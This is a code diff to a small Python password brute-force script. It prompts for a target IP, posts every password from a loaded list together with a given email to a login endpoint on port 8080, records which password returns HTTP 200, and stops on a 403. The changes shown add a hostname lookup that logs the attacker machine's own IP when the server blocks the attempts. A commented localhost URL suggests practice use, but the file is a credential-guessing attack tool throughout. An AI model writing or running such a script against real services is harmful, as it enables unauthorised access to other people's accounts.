@@ -1,5 +1,6 @@
+import socket
 import requests
-from functions.log import rich_log
+from functions.log import forbidden_log, rich_log
 
 # =============================================================== 
 # ================== store passwords in buffer ================== 
@@ -17,13 +18,16 @@ def save_pass_buffer():
 
 # url = "http://127.0.0.1:8080/login/"
 headers = {
-  'Content-Type': 'application/x-www-form-urlencoded'
+  'Content-Type': 'application/x-www-form-urlencoded',
+  
 }
 
 def send_login_request(*, email: str):
-    ip = input("enter IP address: ")
+    target_ip = input("enter target IP address: ")
+    hostname = socket.gethostname()
+    this_ip_add = socket.gethostbyname(hostname)
     
-    url = f"http://{ip}:8080/login/"
+    url = f"http://{target_ip}:8080/login/"
     
     for password_buffer in passwords:
         password = password_buffer.strip()
@@ -34,6 +38,9 @@ def send_login_request(*, email: str):
         response = requests.request("POST", url, headers=headers, data=payload)
         if response.status_code == 200:
             rich_log(email, password, ok=True)
+            break
+        elif response.status_code == 403:
+            forbidden_log(ip=this_ip_add)
             break
         else:
             rich_log(email, password, ok=False)
